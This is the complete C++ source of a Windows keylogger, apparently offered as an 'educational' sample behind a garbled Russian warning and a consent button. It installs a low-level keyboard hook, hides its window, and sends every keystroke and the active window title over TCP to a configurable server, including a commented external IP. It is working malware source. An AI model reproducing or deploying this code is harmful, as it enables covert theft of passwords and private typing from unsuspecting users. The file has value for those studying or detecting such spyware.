/*
* бмхлюмхе!!!
* дюммне опнцпюллмне наеяоевемхе
* яндепфхр б яеае бпеднмнямши тсмйжхнмюк
* х опедмюгмювемн хяйкчвхрекэмн б свеамшу жекъу.
* бмхлюмхе!!!
*/
#include <Windows.h>
#pragma comment(linker,"\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#pragma comment(lib,"Ws2_32.lib")
#include <winsock.h>
#include <time.h>
#include <iostream>
#include <ctime>
#pragma warning  (disable : 4996)

/////////////Macro for IP////////////
#define SERVER_IP "127.0.0.1" //25.41.96.131 127.0.0.1
/////////////Macro for IP////////////



HHOOK hook;
KBDLLHOOKSTRUCT kbStruct;
WSADATA ws;
SOCKET sckt;

char msg[255];
char tim[255];

void Run();

enum class ID {
	AGREEBUTTON,
	TEXT
};

void SEND(int key) {

	//хЛЪ ОПНЦПЮЛЛШ ББНДЮ
	char prevProg[256];
	prevProg[255] = '\0';
	HWND foreground = GetForegroundWindow();
	DWORD threadId;

	HKL keyboardLayout;

	if (foreground) {
		threadId = GetWindowThreadProcessId(foreground, nullptr);
		keyboardLayout = GetKeyboardLayout(threadId);
		char curProg[256];
		GetWindowTextA(foreground, curProg, 256);
		time_t now = time(0);
		char* dt = ctime(&now);

		if (strcmp(prevProg, curProg) != 0) {

			strcpy_s(prevProg, curProg);
			strcpy_s(msg, "\n\n\n[Program: ");
			for (int i = 0; i < sizeof(curProg) - 14; i++) {
				msg[13 + i] = curProg[i];
			}
			msg[strlen(msg) + 2] = '\0';
			msg[strlen(msg) + 1] = '\n';
			msg[strlen(msg)] = ']';

			//нРОПЮБЙЮ ХЛЕМХ ОПНЦПЮЛЛШ
			send(sckt, msg, sizeof(msg), 0);
			strcpy_s(tim, dt);
			send(sckt, tim, sizeof(msg), 0);
		}

		//нАПЮАНРЙЮ МЮФЮРХИ
		bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
			lower = !lower;
		}
		char curKey;
		curKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, GetKeyboardLayout(threadId));

		if (key == VK_BACK) {
			strcpy_s(msg, "[BACKSPACE]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_RETURN) {
			strcpy_s(msg, "[ENTER]\n");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_SPACE) {
			strcpy_s(msg, " ");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_TAB) {
			strcpy_s(msg, "[TAB]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_CONTROL) {
			strcpy_s(msg, "[CONTROL]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_LCONTROL) {
			strcpy_s(msg, "[CONTROL]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_RCONTROL) {
			strcpy_s(msg, "[CONTROL]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_ESCAPE) {
			strcpy_s(msg, "[ESC]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_F1) {
			strcpy_s(msg, "[F1]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_F2) {
			strcpy_s(msg, "[F2]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_F3) {
			strcpy_s(msg, "[F3]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_F4) {
			strcpy_s(msg, "[F4]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_F5) {
			strcpy_s(msg, "[F5]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_F6) {
			strcpy_s(msg, "[F6]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_F7) {
			strcpy_s(msg, "[F7]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_F7) {
			strcpy_s(msg, "[F7]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_F8) {
			strcpy_s(msg, "[F8]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_F9) {
			strcpy_s(msg, "[F9]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_F10) {
			strcpy_s(msg, "[F10]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_F11) {
			strcpy_s(msg, "[F11]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (key == VK_F12) {
			strcpy_s(msg, "[F12]");
			send(sckt, msg, sizeof(msg), 0);
		}
		else if (curKey == '1') {
			if(!lower){
				strcpy_s(msg, "1");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "!");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '2') {
			if (!lower) {
				strcpy_s(msg, "2");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "@");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '3') {
			if(!lower){
				strcpy_s(msg, "3");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "#");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '4') {
			if (!lower) {
				strcpy_s(msg, "4");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "$");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '5') {
			if (!lower) {
				strcpy_s(msg, "5");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "%");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '6') {
			if (!lower) {
				strcpy_s(msg, "6");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "^");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
				else if (curKey == '1') {
			if(!lower){
				strcpy_s(msg, "1");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "!");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '2') {
			if (!lower) {
				strcpy_s(msg, "2");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "@");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '3') {
			if(!lower){
				strcpy_s(msg, "3");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "#");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '4') {
			if (!lower) {
				strcpy_s(msg, "4");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "$");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '5') {
			if (!lower) {
				strcpy_s(msg, "5");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "%");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '6') {
			if (!lower) {
				strcpy_s(msg, "6");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "^");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '7') {
			if (!lower) {
				strcpy_s(msg, "7");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "&");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '8') {
			if (!lower) {
				strcpy_s(msg, "8");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "*");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '9') {
			if (!lower) {
				strcpy_s(msg, "9");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "(");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '0') {
			if (!lower) {
				strcpy_s(msg, "0");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, ")");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '-') {
			if (!lower) {
				strcpy_s(msg, "-");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "_");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '=') {
			if (!lower) {
				strcpy_s(msg, "=");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "+");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '[') {
			if (!lower) {
				strcpy_s(msg, "[");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "{");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == ']') {
			if (!lower) {
				strcpy_s(msg, "]");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "}");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == ';') {
			if (!lower) {
				strcpy_s(msg, ";");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, ":");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '\'') {
			if (!lower) {
				strcpy_s(msg, "'");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "\"");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '\\') {
			if (!lower) {
				strcpy_s(msg, "\\");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "|");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == ',') {
			if (!lower) {
				strcpy_s(msg, ",");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "<");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '.') {
			if (!lower) {
				strcpy_s(msg, ".");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, ">");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '/') {
			if (!lower) {
				strcpy_s(msg, "/");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "?");
				send(sckt, msg, sizeof(msg), 0);
			}
		}
		else if (curKey == '`') {
			if (!lower) {
				strcpy_s(msg, "`");
				send(sckt, msg, sizeof(msg), 0);
			}
			else {
				strcpy_s(msg, "~");
				send(sckt, msg, sizeof(msg), 0);
			}
		}

		else {
			
			if (!lower) {
				curKey = tolower(curKey);
			}
			
			msg[0] = curKey;
			msg[1] = '\0';
			send(sckt, msg, sizeof(msg), 0);
		}
	}
}

LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN) {
			kbStruct = *((KBDLLHOOKSTRUCT*)lParam);
			SEND(kbStruct.vkCode);
		}
	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

WNDCLASSW CreateNewWindowClass(HBRUSH BGColor, HCURSOR Cursor, HINSTANCE hInst, HICON Icon, LPCWSTR Name, WNDPROC Procedure) {
	WNDCLASSW NewWindow = { 0 };
	NewWindow.hCursor = Cursor;
	NewWindow.hIcon = Icon;
	NewWindow.hInstance = hInst;
	NewWindow.lpszClassName = Name;
	NewWindow.hbrBackground = BGColor;
	NewWindow.lpfnWndProc = Procedure;
	return NewWindow;
}

LRESULT CALLBACK MenuProcedure(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp) {
	switch (msg) {
	case WM_CREATE: {
		//HWND Text = CreateWindow(L"Static", L"Do you agree?", WS_VISIBLE | WS_CHILD, 200, 0, 100, 30, hWnd, reinterpret_cast<HMENU>(ID::TEXT), NULL, NULL); //мЮЯРПНХРЭ ОПЕДСОПЕФДЕМХЕ
		HWND Text = CreateWindow(L"Static", 
		L"бмхлюмхе!!!\nдюммне опнцпюллмне наеяоевемхе\nяндепфхр б яеае бпеднмнямши тсмйжхнмюк\nх опедмюгмювемн хяйкчвхрекэмн б свеамшу жекъу.\nмюфхлюъ ймнойс \"ъ янцкюяем\",\nбш янцкюьюереяэ мю гюосяй\nбпеднмнямнцн он мю бюьел сярпниярбе\nбмхлюмхе!!!", 
		WS_VISIBLE | WS_CHILD, 50, 50, 500, 500, hWnd, reinterpret_cast<HMENU>(ID::TEXT), NULL, NULL);

		HWND Button = CreateWindow(L"Button", L"ъ янцкюяем", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 200, 235, 100, 30, hWnd, reinterpret_cast<HMENU>(ID::AGREEBUTTON), NULL, NULL);

		return 0;
	}

	case WM_COMMAND: {
		switch (LOWORD(wp)) {
			case (int)(ID::AGREEBUTTON) : {
				ShowWindow(hWnd, SW_HIDE);
				Run();
				PostQuitMessage(0);
				break;
			}
		}
		return 0;
	}

	case WM_DESTROY: {

		PostQuitMessage(0);
		return 0;
	}
	default:
		return DefWindowProcW(hWnd, msg, wp, lp);
	}
}

LRESULT CALLBACK LoggerProcedure(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp) {
	switch (msg) {
	case WM_CREATE: {
		return 0;
	}

	case WM_DESTROY: {

		PostQuitMessage(0);
		return 0;
	}

	default:
		return DefWindowProcW(hWnd, msg, wp, lp);
	}
}


void Run() {
	WNDCLASSW LoggerClass = CreateNewWindowClass((HBRUSH)COLOR_WINDOW, LoadCursor(NULL, IDC_ARROW), nullptr, LoadIcon(NULL, IDI_APPLICATION), L"LoggerWindowClass", LoggerProcedure);
	HWND hWND = { 0 };
	if (!RegisterClassW(&LoggerClass)) { exit(-1); }
	hWND = CreateWindow(L"LoggerWindowClass", L"Logger", WS_OVERLAPPEDWINDOW, 750, 250, 500, 500, nullptr, nullptr, nullptr, nullptr);

	//мЮВХМЮЕЛ ПЮАНРС Я ЯНЙЕРНЛ
	WSAStartup(MAKEWORD(2, 2), &ws);
	sckt = socket(AF_INET, SOCK_STREAM, 0);

	SOCKADDR_IN scktin;
	memset(&scktin, 0, sizeof(scktin));
	scktin.sin_family = AF_INET;
	scktin.sin_port = htons(7777);
	scktin.sin_addr.S_un.S_addr = inet_addr(SERVER_IP); //25.41.96.131 127.0.0.1
	connect(sckt, (sockaddr*)&scktin, sizeof(scktin));


	//яНГДЮЕЛ УСЙ
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, nullptr, 0);

	MSG LoggerMessage = { 0 };
	while (GetMessage(&LoggerMessage, NULL, NULL, NULL)) {
		TranslateMessage(&LoggerMessage);
		DispatchMessage(&LoggerMessage);
	};
}



int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrevInst, PWSTR args, int ncmdshow) {
	setlocale(LC_ALL, "RUS");
	WNDCLASSW MenuClass = CreateNewWindowClass((HBRUSH)COLOR_WINDOW, LoadCursor(NULL, IDC_ARROW), hInst, LoadIcon(NULL, IDI_APPLICATION), L"MenuWindowClass", MenuProcedure);
	HWND hWNDmenu = { 0 };
	if (!RegisterClassW(&MenuClass)) { return -1; }

	MSG MainMessage = { 0 };
	hWNDmenu = CreateWindow(L"MenuWindowClass", L"MENU", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 750, 250, 500, 500, nullptr, nullptr, hInst, nullptr);

	while (GetMessage(&MainMessage, NULL, NULL, NULL)) {
		TranslateMessage(&MainMessage);
		DispatchMessage(&MainMessage);
	};
	closesocket(sckt);
	return 0;
}
